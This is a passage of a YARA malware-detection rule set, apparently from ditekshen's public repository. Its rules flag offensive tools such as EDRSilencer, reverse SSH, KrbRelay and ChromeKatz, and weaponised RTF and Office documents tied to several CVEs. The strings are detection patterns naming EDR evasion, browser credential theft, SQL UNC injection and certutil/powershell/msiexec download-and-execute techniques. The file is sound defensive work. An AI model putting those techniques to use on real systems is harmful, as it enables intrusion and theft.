		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "4ad0ac389bf8961b0dd987a72d5dd534e5e3cc673f0e07aa49d39d1fd3f5f53e"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "main.connectviaproxy" ascii
		$s2 = "main.connectForSocks" ascii
		$s3 = "main.listenForClients" ascii
		$s4 = "main.listenForSocks" ascii
		$s5 = "Proxy-Authorization: NTLM TlRMTVNTUAABAAAABoIIAAAAAAAAAAAAAAAAAAAAAAA=" ascii

	condition:
		( uint16( 0 ) == 0x5a4d or uint16( 0 ) == 0x457f ) and all of them
}
rule DITEKSHEN_INDICATOR_TOOL_Scmaldevinj_Go : FILE
{
	meta:
		description = "Detects Go shell/malware dev injector"
		author = "ditekShen"
		id = "56ec114f-8e16-5ab6-ae3b-a182cb381b4a"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1783-L1793"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "48c3c759283c63a0c439cfba0194da89f402189e4c3cd831c22b5078ccae47b1"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "hooka/shellcode.go" ascii
		$s2 = "/maldev\x09v" ascii
		$s3 = "Binject/debug/pe." ascii

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}
rule DITEKSHEN_INDICATOR_TOOL_Reversessh_Go : FILE
{
	meta:
		description = "Detects golang reverse ssh tool"
		author = "ditekShen"
		id = "4fb671aa-ad42-5f7e-bd5a-c19f018088c9"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1795-L1804"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "4f9899aacc09c7da05fb5d412cfe8e91ee0d8e922189a6f921410d73ae8b3a9c"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "/reverse_ssh/" ascii
		$s2 = "main.rsshService" ascii

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}
rule DITEKSHEN_INDICATOR_TOOL_Sharpghosttask : FILE
{
	meta:
		description = "Detects SharpGhostTask"
		author = "ditekSHen"
		id = "84d71179-0cfd-5389-b6bd-92c292361b3c"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1806-L1817"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "3de8d9fe7804e208ff556b6bedbd80eebfda1a730626403418a555ad9fbbb820"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$x1 = "Ghosted" wide
		$x2 = /--target(binary|task)/ fullword wide
		$x3 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\T" wide nocase
		$s4 = "__GhostTask|" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 3 of them
}
rule DITEKSHEN_INDICATOR_TOOL_Krbrelay : FILE
{
	meta:
		description = "Detects KrbRelay"
		author = "ditekshen"
		id = "c8baac8a-54f3-5f53-93f8-daabeaaaff44"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1819-L1836"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "f76b585cd2d741eab9d91ffd5a34c38696ac573cba1a3752d21c4b8b6681ad7b"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "System.Collections.Generic.IEnumerable<System.IntPtr>.GetEnumerator" fullword ascii
		$s2 = "System.Collections.Generic.IEnumerator<System.IntPtr>.get_Current" fullword ascii
		$s3 = "GetProcessIdFromIPid" fullword ascii
		$g1 = "hello.stg" fullword wide
		$g2 = "DSInternals.Common" fullword ascii
		$g3 = "C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_7b3eed059f4c3e41\\Amd64\\UNIDRV.DLL" fullword wide
		$g4 = "C:\\Windows\\System32\\kernelbase.dll" fullword wide
		$g5 = "get_UnsupportedSecretEncryptionType" fullword ascii
		$g6 = "CoInitializeSecurity Error: 0x{0:X8}. Exploit will fail." fullword wide
		$g7 = "AuthnSvc: {0} - PrincName: {1}" fullword wide

	condition:
		uint16( 0 ) == 0x5a4d and ( ( all of ( $s* ) and 4 of ( $g* ) ) or ( 7 of them ) )
}
rule DITEKSHEN_INDICATOR_TOOL_Edrsilencer : FILE
{
	meta:
		description = "Detects EDRSilencer"
		author = "ditekshen"
		id = "29b6da1e-9138-5ee6-b9fd-d7b3c7f48626"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1838-L1857"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "da00aced2608fd5e192397ef2346ac247f29f993995fb90189e05da60be15d13"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "block \"C:\\Windows\\System32\\curl.exe\"" ascii
		$s2 = "blockedr" fullword ascii
		$s3 = "edrProcess" fullword ascii
		$s4 = "BlockEdrProcessTraffic" fullword ascii
		$s5 = "isInEdrProcessList" fullword ascii
		$s6 = "EDRSilencer.c" fullword ascii
		$v1 = "elastic-agent.exe" fullword ascii nocase
		$v2 = "CybereasonAV.exe" fullword ascii nocase
		$v3 = "SentinelAgent.exe" fullword ascii nocase
		$v4 = "fortiedr.exe" fullword ascii nocase
		$v5 = "MsMpEng.exe" fullword ascii nocase
		$v6 = "CylanceSvc.exe" fullword ascii nocase

	condition:
		uint16( 0 ) == 0x5a4d and ( 4 of ( $s* ) or ( 3 of ( $s* ) and 1 of ( $v* ) ) )
}
rule DITEKSHEN_INDICATOR_TOOL_Edrprison : FILE
{
	meta:
		description = "Detects EDRPrison"
		author = "ditekshen"
		id = "85831265-fd9e-5e0e-b5d9-22bf1c89b3f2"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1859-L1872"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "e1ef9e9c6bd0d2efa7b0b617fb52100075658221559f92a61c672807ab5a4d77"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "Block:" wide
		$s2 = "PacketLen:" wide
		$s3 = "DoWorkPacket_Step" ascii
		$s4 = "DoWorkAsyncNETWORK" ascii
		$s5 = "BlockMessage" ascii
		$s6 = "GetRmAddrPortNetwork" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 5 of them
}
rule DITEKSHEN_INDICATOR_TOOL_Sharpsqlpwn : FILE
{
	meta:
		description = "Detects SharpSQLPwn"
		author = "ditekshen"
		id = "f99c0ddb-a073-5c15-9a7c-60f6766cd0a2"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1874-L1891"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "c811d4926c433c6521f4bbe03a1abf4a5b27b56931a18a8bb672f37fe4fccfb8"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "smb_ip" fullword ascii
		$s2 = "Recon" fullword ascii
		$s3 = "UNCPathInjection" fullword ascii
		$s4 = "from sys.server_principals" wide
		$s5 = "EXEC sp_configure '" wide
		$s6 = "EXEC ('sp_configure" wide
		$s7 = "CREATE ASSEMBLY" wide
		$s8 = "DROP ASSEMBLY" wide
		$s9 = "FROM 0x" wide
		$s10 = "EXEC master..xp_dirtree \"\\\\" wide

	condition:
		uint16( 0 ) == 0x5a4d and 7 of them
}
rule DITEKSHEN_INDICATOR_TOOL_Chromekatz : FILE
{
	meta:
		description = "Detects ChromeKatz: CookieKatz and CredentialKatz"
		author = "ditekshen"
		id = "9dd706c8-552c-5c96-9b81-cfd50157ac34"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1893-L1908"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "4f1bdbb7f8c4893444baac287c8fcefaca80a4301845706b56e9f9628c9f116f"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "\\include\\xmemory" ascii wide
		$s2 = "targetBrowser" ascii
		$s3 = "thirdPattern" ascii
		$s4 = "isBrowserWow64" ascii
		$s5 = "wcscpy_s(memory, size_in_elements, string)" fullword wide
		$s6 = "hChrome" fullword ascii
		$t1 = "szCookieMonster" fullword ascii
		$t2 = "szPasswordReuseDetectorInstances" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and 6 of them
}
rule DITEKSHEN_INDICATOR_RTF_EXPLOIT_CVE_2017_0199_1 : CVE_2017_0199 FILE
{
	meta:
		description = "Detects RTF documents potentially exploiting CVE-2017-0199"
		author = "ditekSHen"
		id = "74b3702a-7b4d-58be-ad2c-c2b1cf0ebc50"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L1-L69"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "06b75267f00b775a6c1cd7a2022a9cfa0ea2c976f969c2c066be51449f197f58"
		score = 75
		quality = 75
		tags = "CVE-2017-0199, FILE"

	strings:
		$urlmoniker3 = { 45 0a 30 0a 43 0a 39 0a 45 0a 41 0a 37 0a 39 0a 
                         46 0a 39 0a 42 0a 41 0a 43 0a 45 0a 31 0a 31 0a 
                         38 0a 43 0a 38 0a 32 0a 30 0a 30 0a 41 0a 41 0a 
                         30 0a 30 0a 34 0a 42 0a 41 0a 39 0a 30 0a 42 }
		$urlmoniker4 = { 45 0d 0a 30 0d 0a 43 0d 0a 39 0d 0a 45 0d 0a 41
                         0d 0a 37 0d 0a 39 0d 0a 46 0d 0a 39 0d 0a 42 0d 
                         0a 41 0d 0a 43 0d 0a 45 0d 0a 31 0d 0a 31 0d 0a
                         38 0d 0a 43 0d 0a 38 0d 0a 32 0d 0a 30 0d 0a 30
                         0d 0a 41 0d 0a 41 0d 0a 30 0d 0a 30 0d 0a 34 0d
                         0a 42 0d 0a 41 0d 0a 39 0d 0a 30 0d 0a 42 }
		$urlmoniker6 = { 65 0a 30 0a 63 0a 39 0a 65 0a 61 0a 37 0a 39 0a
                         66 0a 39 0a 62 0a 61 0a 63 0a 65 0a 31 0a 31 0a
                         38 0a 63 0a 38 0a 32 0a 30 0a 30 0a 61 0a 61 0a
                         30 0a 30 0a 34 0a 62 0a 61 0a 39 0a 30 0a 62 }
		$urlmoniker7 = { 65 0d 0a 30 0d 0a 63 0d 0a 39 0d 0a 65 0d 0a 61
                         0d 0a 37 0d 0a 39 0d 0a 66 0d 0a 39 0d 0a 62 0d
                         0a 61 0d 0a 63 0d 0a 65 0d 0a 31 0d 0a 31 0d 0a
                         38 0d 0a 63 0d 0a 38 0d 0a 32 0d 0a 30 0d 0a 30
                         0d 0a 61 0d 0a 61 0d 0a 30 0d 0a 30 0d 0a 34 0d
                         0a 62 0d 0a 61 0d 0a 39 0d 0a 30 0d 0a 62 }
		$ole1 = { d0 cf 11 e0 a1 b1 1a e1 }
		$ole2 = "d0cf11e0a1b11ae1" ascii nocase
		$ole3 = "64306366313165306131623131616531" ascii
		$ole4 = "640a300a630a660a310a310a650a300a610a310a620a310a310a610a650a31" ascii nocase
		$ole5 = { 64 0a 30 0a 63 0a 66 0a 31 0a 31 0a 65 0a 30 }
		$ole6 = { 64 0d 0a 30 0d 0a 63 0d 0a 66 0d 0a 31 0d 0a 31 0d 0a 65 0d 0a 30 }
		$obj1 = "\\objhtml" ascii
		$obj2 = "\\objdata" ascii
		$obj3 = "\\objupdate" ascii
		$obj4 = "\\objemb" ascii
		$obj5 = "\\objautlink" ascii
		$obj6 = "\\objlink" ascii

	condition:
		uint32( 0 ) == 0x74725c7b and 1 of ( $urlmoniker* ) and 1 of ( $ole* ) and 1 of ( $obj* )
}
rule DITEKSHEN_INDICATOR_RTF_Exploit_Scripting : CVE_2017_8759 CVE_2017_8570 FILE
{
	meta:
		description = "detects CVE-2017-8759 or CVE-2017-8570 weaponized RTF documents."
		author = "ditekSHen"
		id = "e8fd1231-3ef5-5b0b-987c-f55337804da3"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L270-L302"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a1f4c833f0132dcbe2b3677d6ac0f3597c152702515375d60d4332c21183bd76"
		score = 75
		quality = 75
		tags = "CVE-2017-8759, CVE-2017-8570, FILE"

	strings:
		$clsid1 = { 00 03 00 00 00 00 00 00 c0 00 00 00 00 00 00 46 }
		$clsid2 = "0003000000000000c000000000000046" ascii nocase
		$clsid3 = "4f4c45324c696e6b" ascii nocase
		$clsid4 = "OLE2Link" ascii nocase
		$ole1 = { d0 cf 11 e0 a1 b1 1a e1 }
		$ole2 = "d0cf11e0a1b11ae1" ascii nocase
		$ole3 = "64306366313165306131623131616531" ascii
		$ole4 = "640a300a630a660a310a310a650a300a610a310a620a310a310a610a650a31"
		$ole5 = { 64 30 63 66 [0-2] 31 31 65 30 61 31 62 31 31 61 65 31 }
		$ole6 = "D0cf11E" ascii nocase
		$obj1 = "\\objhtml" ascii
		$obj2 = "\\objdata" ascii
		$obj3 = "\\objupdate" ascii
		$obj4 = "\\objemb" ascii
		$obj5 = "\\objautlink" ascii
		$obj6 = "\\objlink" ascii
		$obj7 = "\\mmath" ascii
		$obj8 = "\\objclass htmlfile" ascii
		$sct1 = { 33 (43|63) (3533|3733) (3433|3633) (3532|3732) (3439|3639)( 3530|3730) (3534|3734) (3443|3643) (3435|3635) (3534|3734) }
		$sct2 = { (3737|3537) (3733|3533) (3633|3433) (3732|3532) (3639|3439) (3730|3530) (3734|3534) (3245|3265) (3733|3533) (3638|3438) (3635|3435) (3643|3443) (3643|3443) }

	condition:
		uint32( 0 ) == 0x74725c7b and 1 of ( $clsid* ) and 1 of ( $ole* ) and 1 of ( $obj* ) and 1 of ( $sct* )
}
rule DITEKSHEN_INDICATOR_RTF_Embedded_Excel_Sheetmacroenabled : FILE
{
	meta:
		description = "Detects RTF documents embedding an Excel sheet with macros enabled. Observed in exploit followed by dropper behavior"
		author = "ditekSHen"
		id = "342d10b3-61d2-5fcb-8f4f-1fe45049257b"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L304-L328"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "cc3b52e549c2697c6e0a2fea365d193311d90d26854bd2fe321aa26c118975a0"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$ex1 = "457863656c2e53686565744d6163726f456e61626c65642e" ascii nocase
		$ex2 = "0002083200000000c000000000000046" ascii nocase
		$ex3 = "Excel.SheetMacroEnabled." ascii
		$ole1 = { d0 cf 11 e0 a1 b1 1a e1 }
		$ole2 = "d0cf11e0a1b11ae1" ascii nocase
		$ole3 = "64306366313165306131623131616531" ascii
		$ole4 = "640a300a630a660a310a310a650a300a610a310a620a310a310a610a650a31"
		$obj1 = "\\objhtml" ascii
		$obj2 = "\\objdata" ascii
		$obj3 = "\\objupdate" ascii
		$obj4 = "\\objemb" ascii
		$obj5 = "\\objautlink" ascii
		$obj6 = "\\objlink" ascii
		$obj7 = "\\mmath" ascii

	condition:
		uint32( 0 ) == 0x74725c7b and ( 1 of ( $ex* ) and 1 of ( $ole* ) and 2 of ( $obj* ) )
}
rule DITEKSHEN_INDICATOR_OLE_Metadatacmd : FILE
{
	meta:
		description = "Detects OLE documents with Windows command-line utilities commands (certutil, powershell, etc.) stored in the metadata (author, last modified by, etc.)."
		author = "ditekSHen"
		id = "63b23630-b344-5fba-95f4-950d072beaff"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L330-L349"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "0562d026a1ad4510310ebff5da154064f92afc7bf714973f7de362435476772c"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$cmd1 = { 00 1E 00 00 00 [1-4] 00 00 (63|43) (6D|4D) (64|44) (00|20) }
		$cmd2 = { 00 1E 00 00 00 [1-4] 00 00 (6D|4D) (73|53) (68|48) (74|54) (61|41) (00|20) }
		$cmd3 = { 00 1E 00 00 00 [1-4] 00 00 (77|57) (73|53) (63|43) (72|52) (69|49) (70|50) (74|54) (00|20) }
		$cmd4 = { 00 1E 00 00 00 [1-4] 00 00 (63|42) (65|45) (72|52) (74|54) (75|55) (74|54) (69|49) (6C|4C) (00|20) }
		$cmd5 = { 00 1E 00 00 00 [1-4] 00 00 (70|50) (6F|4F) (77|57) (65|45) (72|52) (73|43) (68|48) (65|45) (6C|4C) (6C|4C) (00|20) }
		$cmd6 = { 00 1E 00 00 00 [1-4] 00 00 (6E|4E) (65|45) (74|54) 2E (77|57) (65|45) (62|42) (63|43) (6C|4C) (69|49) (65|45) (6E|4E) (74|54) (00|20) }

	condition:
		uint16( 0 ) == 0xcfd0 and any of them
}
rule DITEKSHEN_INDICATOR_RTF_Equation_Bitsadmin_Downloader : FILE
{
	meta:
		description = "Detects RTF documents that references both Microsoft Equation Editor and BITSAdmin. Common exploit + dropper behavior."
		author = "ditekSHen"
		id = "e96a6f18-9a5e-58ca-829e-c82b444ad403"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L428-L451"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "39a07a0af243e929a6b3df48b6cf8a9d30bc8ef9e7deac494348945427b015e7"
		score = 75
		quality = 75
		tags = "FILE"
		snort2_sid = "910002-910003"
		snort3_sid = "910001"
		clamav_sig = "INDICATOR.RTF.EquationBITSAdminDownloader"

	strings:
		$eq = "0200000002CE020000000000C000000000000046" ascii nocase
		$ba = "6269747361646d696e" ascii nocase
		$obj1 = "\\objhtml" ascii
		$obj2 = "\\objdata" ascii
		$obj3 = "\\objupdate" ascii
		$obj4 = "\\objemb" ascii
		$obj5 = "\\objautlink" ascii
		$obj6 = "\\objlink" ascii
		$obj7 = "\\mmath" ascii

	condition:
		uint32( 0 ) == 0x74725c7b and ( ( $eq and $ba ) and 1 of ( $obj* ) )
}
rule DITEKSHEN_INDICATOR_RTF_Equation_Certutil_Downloader : FILE
{
	meta:
		description = "Detects RTF documents that references both Microsoft Equation Editor and CertUtil. Common exploit + dropper behavior."
		author = "ditekSHen"
		id = "a47f31f9-91fc-5009-8aff-2b9e334c3139"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L453-L476"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "d6c62957ce40ed755a84bd9aa8900e4990c466097d6df55c539b289bf50fe94e"
		score = 75
		quality = 75
		tags = "FILE"
		snort2_sid = "910006-910007"
		snort3_sid = "910003"
		clamav_sig = "INDICATOR.RTF.EquationCertUtilDownloader"

	strings:
		$eq = "0200000002CE020000000000C000000000000046" ascii nocase
		$cu = "636572747574696c" ascii nocase
		$obj1 = "\\objhtml" ascii
		$obj2 = "\\objdata" ascii
		$obj3 = "\\objupdate" ascii
		$obj4 = "\\objemb" ascii
		$obj5 = "\\objautlink" ascii
		$obj6 = "\\objlink" ascii
		$obj7 = "\\mmath" ascii

	condition:
		uint32( 0 ) == 0x74725c7b and ( ( $eq and $cu ) and 1 of ( $obj* ) )
}
rule DITEKSHEN_INDICATOR_RTF_Equation_Powershell_Downloader : FILE
{
	meta:
		description = "Detects RTF documents that references both Microsoft Equation Editor and PowerShell. Common exploit + dropper behavior."
		author = "ditekSHen"
		id = "5d1d65ef-e183-5a0d-a0fa-d0d5f09f21a1"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L478-L501"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "0b8b9b7b40f8b4d659de9e025a65d5c6b64c6066bb618a3e7ed3c318f70befe5"
		score = 75
		quality = 75
		tags = "FILE"
		snort2_sid = "910004-910005"
		snort3_sid = "910002"
		clamav_sig = "INDICATOR.RTF.EquationPowerShellDownloader"

	strings:
		$eq = "0200000002CE020000000000C000000000000046" ascii nocase
		$ps = "706f7765727368656c6c" ascii nocase
		$obj1 = "\\objhtml" ascii
		$obj2 = "\\objdata" ascii
		$obj3 = "\\objupdate" ascii
		$obj4 = "\\objemb" ascii
		$obj5 = "\\objautlink" ascii
		$obj6 = "\\objlink" ascii
		$obj7 = "\\mmath" ascii

	condition:
		uint32( 0 ) == 0x74725c7b and ( ( $ps and $eq ) and 1 of ( $obj* ) )
}
rule DITEKSHEN_INDICATOR_RTF_LNK_Shell_Explorer_Execution : FILE
{
	meta:
		description = "detects RTF files with Shell.Explorer.1 OLE objects with embedded LNK files referencing an executable."
		author = "ditekSHen"
		id = "2cac4dd8-086a-5220-a658-94cedd9cf7c3"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L503-L517"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "4c11a37425e260692e11dc8fca317611106245d1590081a7038036ad568702f8"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$clsid = "c32ab2eac130cf11a7eb0000c05bae0b" ascii nocase
		$lnk_header = "4c00000001140200" ascii nocase
		$http_url = "6800740074007000" ascii nocase
		$file_url = "660069006c0065003a" ascii nocase

	condition:
		uint32( 0 ) == 0x74725c7b and filesize < 1500KB and $clsid and $lnk_header and ( $http_url or $file_url )
}
rule DITEKSHEN_INDICATOR_RTF_Forms_HTML_Execution : FILE
{
	meta:
		description = "detects RTF files with Forms.HTML:Image.1 or Forms.HTML:Submitbutton.1 OLE objects referencing file or HTTP URLs."
		author = "ditekSHen"
		id = "26b21c94-9192-53be-808b-b553f87769e1"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L519-L533"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "5e8a2072971c40d6fbc0e0265a9adfbe4faa04d0f3c6962fda443da33aa06906"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$img_clsid = "12d11255c65ccf118d6700aa00bdce1d" ascii nocase
		$sub_clsid = "10d11255c65ccf118d6700aa00bdce1d" ascii nocase
		$http_url = "6800740074007000" ascii nocase
		$file_url = "660069006c0065003a" ascii nocase

	condition:
		uint32( 0 ) == 0x74725c7b and filesize < 1500KB and ( $img_clsid or $sub_clsid ) and ( $http_url or $file_url )
}
rule DITEKSHEN_INDICATOR_PUB_MSIEXEC_Remote : FILE
{
	meta:
		description = "detects VB-enable Microsoft Publisher files utilizing Microsoft Installer to retrieve remote files and execute them"
		author = "ditekSHen"
		id = "518db2bb-174b-54c4-b330-1e8a8e36265d"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L535-L549"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "be5407e6e6e21e77f6de1d3a378996bfc6ce4326986aa03eb152e772bb495184"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "Microsoft Publisher" ascii
		$s2 = "msiexec.exe" ascii
		$s3 = "Document_Open" ascii
		$s4 = "/norestart" ascii
		$s5 = "/i http" ascii
		$s6 = "Wscript.Shell" fullword ascii
		$s7 = "\\VBE6.DLL#" wide

	condition:
		uint16( 0 ) == 0xcfd0 and 6 of them
}
rule DITEKSHEN_INDICATOR_RTF_Ancalog_Exploit_Builder_Document : FILE
{
	meta:
		description = "Detects documents generated by Phantom Crypter/Ancalog"
		author = "ditekSHen"
		id = "01e7f949-8ced-5355-978c-34d6e639e61a"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L551-L563"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "e458be78ca8975d067110dc38119437b3ffe55afdbfdab47468c9ed74bba9f9d"
		score = 75
		quality = 75
		tags = "FILE"
		snort2_sid = "910000-910001"
		snort3_sid = "910000"
		clamav_sig = "INDICATOR.RTF.AncalogExploitBuilderDocument"

	strings:
		$builder1 = "{\\*\\ancalog" ascii
		$builder2 = "\\ancalog" ascii

	condition:
		uint32( 0 ) == 0x74725c7b and 1 of ( $builder* )
}
rule DITEKSHEN_INDICATOR_RTF_Threadkit_Exploit_Builder_Document : FILE
{
	meta:
		description = "Detects vaiations of RTF documents generated by ThreadKit builder."
		author = "ditekSHen"
		id = "f4a4e7f0-ea2f-523f-9634-a939dc90706e"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L565-L582"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "f2308ac6ae5345e0c783871dd6b471397ec83ba7194db5cc74c8984d84c2c0c2"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$obj1 = "\\objhtml" ascii
		$obj2 = "\\objdata" ascii
		$obj3 = "\\objupdate" ascii
		$obj4 = "\\objemb" ascii
		$obj5 = "\\objautlink" ascii
		$obj6 = "\\objlink" ascii
		$obj7 = "\\mmath" ascii
		$pat1 = /\\objupdate\\v[\\\s\n\r]/ ascii

	condition:
		uint32( 0 ) == 0x74725c7b and 2 of ( $obj* ) and 1 of ( $pat* )
}
rule DITEKSHEN_INDICATOR_XML_Legacydrawing_Autoload_Document : FILE
{
	meta:
		description = "detects AutoLoad documents using LegacyDrawing"
		author = "ditekSHen"
		id = "ce116601-7048-5a3f-9b73-5127ca3b359e"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L584-L594"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a038636f5e8e7837c2209072f1659b921c8a9a48d4ed153e735915cf1f7f3fcc"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "<legacyDrawing r:id=\"" ascii
		$s2 = "<oleObject progId=\"" ascii
		$s3 = "autoLoad=\"true\"" ascii

	condition:
		uint32( 0 ) == 0x6d783f3c and all of ( $s* )
}
